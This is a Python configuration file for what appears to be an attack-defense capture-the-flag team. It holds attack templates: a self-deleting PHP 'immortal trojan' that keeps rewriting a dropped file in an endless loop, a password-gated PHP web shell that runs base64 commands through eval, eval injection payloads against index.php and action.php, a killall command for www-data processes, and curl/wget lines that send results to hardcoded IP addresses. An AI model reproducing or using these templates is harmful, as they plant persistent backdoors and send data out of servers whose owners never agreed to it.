#use utf-8
import hashlib
import base64
import time
class BckDoorConfig:
    payload={}
    url=''
    headers={}
    method=''
    resultStartPos=''
    resultEndPos=''
    def __init__(self,payload,url,headers={'Content-Type':'application/x-www-form-urlencoded'},method='post',resultStartPos='',resultEndPos=''):
        self.payload=payload
        self.url=url
        self.headers=headers
        self.method=method
        self.resultEndPos=resultEndPos
        self.resultStartPos=resultStartPos

token='serfendTeam'
ips=['47.74.238.240:8802','47.74.238.240:8801']
webrootPath=''
rawbackdoor_list=[
    BckDoorConfig('copyright={0}','index.php',method='get',resultStartPos='/h5>',resultEndPos='<h5>hello')
]

# BckDoorConfig('page=normaliz&mail_replacement={0}&source=a&method=/a/e','action.php',resultStartPos='',resultEndPos='<html'),
#     BckDoorConfig('page=md5&res="or eval($_POST[a]) or"&a={0};','action.php'),
#     BckDoorConfig('666={0};','1.php'),

immortalTroj_tpl="""<?php
unlink(__FILE__);
ignore_user_abort(true);
set_time_limit(0);
while (1){{
	file_put_contents('{1}',base64_decode('{0}'));
	usleep(1000);
    }}
    ?>
    
"""

backdoor_tpl="""<?php
    echo 'your id:' . md5($_GET['{0}']) . '-to-{1}';
    if (md5($_GET['{0}'])==='{1}'){{
    $tmp=base64_decode($_POST['cmd']);
    @eval($tmp);}}?>
    
    """
uploader="/bin/echo '{0}' | /usr/bin/base64 -d > {1}"
killer="killall -uwww-data"
backdoor_des=[]
backdoor_url=[]
backdoor_key=[]

httpSendModel=[
    "/usr/bin/curl {0} -d '{1}'",
    "/usr/bin/wget {0}/?{1}",
    "{0}"
]
